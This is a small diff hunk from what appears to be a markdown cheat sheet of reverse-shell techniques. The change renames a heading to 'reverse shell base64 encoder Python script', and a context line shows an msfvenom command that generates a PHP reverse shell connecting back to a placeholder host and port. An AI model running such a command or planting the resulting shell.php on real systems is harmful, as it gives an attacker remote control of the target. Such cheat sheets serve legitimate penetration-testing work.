@@ -113,7 +113,7 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
 
 
-## base64 encoder Python script
+## reverse shell base64 encoder Python script
 ``` python
 import sys
 import base64
